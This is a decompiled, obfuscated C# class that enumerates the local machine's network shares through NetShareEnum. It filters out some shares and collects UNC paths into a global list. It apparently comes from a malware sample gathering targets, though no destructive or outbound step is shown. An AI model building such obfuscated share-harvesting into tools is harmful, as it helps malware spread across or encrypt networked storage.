using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace VyjVuXvolaw;

public sealed class GtnXAQsBIqq
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct GnbhEMUMDTwwUvLn
	{
		public string LINzJVqXLwLI;

		public uint LuTvasGhrMwNX;

		public string SfwsgMwzBy;

		public GnbhEMUMDTwwUvLn(string string_0, uint uint_0, string string_1)
		{
			LINzJVqXLwLI = string_0;
			LuTvasGhrMwNX = uint_0;
			SfwsgMwzBy = string_1;
		}

		public override string ToString()
		{
			return LINzJVqXLwLI;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	public GnbhEMUMDTwwUvLn[] fvCPEvWZhnq(string string_0)
	{
		List<GnbhEMUMDTwwUvLn> list = new List<GnbhEMUMDTwwUvLn>();
		int int_ = 0;
		int int_2 = 0;
		int int_3 = 0;
		int num = Marshal.SizeOf(typeof(GnbhEMUMDTwwUvLn));
		IntPtr intptr_ = IntPtr.Zero;
		StringBuilder stringBuilder_ = new StringBuilder(string_0);
		int num2 = NetShareEnum(stringBuilder_, 1, ref intptr_, uint.MaxValue, ref int_, ref int_2, ref int_3);
		if (num2 == 0)
		{
			IntPtr ptr = intptr_;
			for (int i = 0; i < int_; i++)
			{
				GnbhEMUMDTwwUvLn item = (GnbhEMUMDTwwUvLn)Marshal.PtrToStructure(ptr, typeof(GnbhEMUMDTwwUvLn));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(intptr_);
			return list.ToArray();
		}
		list.Add(new GnbhEMUMDTwwUvLn(getString_0(107398979) + num2, 10u, string.Empty));
		return list.ToArray();
	}

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	public static void GDqNUKzgVSJjD()
	{
		try
		{
			string[] logicalDrives = Directory.GetLogicalDrives();
			GnbhEMUMDTwwUvLn[] array = new GtnXAQsBIqq().fvCPEvWZhnq(Environment.MachineName);
			GnbhEMUMDTwwUvLn[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				GnbhEMUMDTwwUvLn gnbhEMUMDTwwUvLn = array2[i];
				if (gnbhEMUMDTwwUvLn.ToString().Contains(getString_0(107398970)) || gnbhEMUMDTwwUvLn.ToString().Contains(getString_0(107398993)) || gnbhEMUMDTwwUvLn.ToString().Contains(getString_0(107398984)) || gnbhEMUMDTwwUvLn.ToString().Contains(getString_0(107388272)) || logicalDrives.Contains(gnbhEMUMDTwwUvLn.ToString().Replace(getString_0(107403804), getString_0(107398943))))
				{
					continue;
				}
				if (!CRZFkRWzfSXjW.jwBOsivrxmQ.Contains(getString_0(107388259) + Environment.MachineName + getString_0(107396904) + gnbhEMUMDTwwUvLn))
				{
					CRZFkRWzfSXjW.jwBOsivrxmQ.Add(getString_0(107388259) + Environment.MachineName + getString_0(107396904) + gnbhEMUMDTwwUvLn);
				}
				if (CRZFkRWzfSXjW.RiGciHwEXLcD)
				{
					try
					{
						Console.WriteLine(getString_0(107398938), getString_0(107388259) + Environment.MachineName + getString_0(107396904) + gnbhEMUMDTwwUvLn);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (CRZFkRWzfSXjW.VLajbDNhoSbf)
			{
				try
				{
					File.AppendAllText(CRZFkRWzfSXjW.MGkBzYPheHDPb, getString_0(107398913) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static GtnXAQsBIqq()
	{
		Strings.CreateGetStringDelegate(typeof(GtnXAQsBIqq));
	}
}
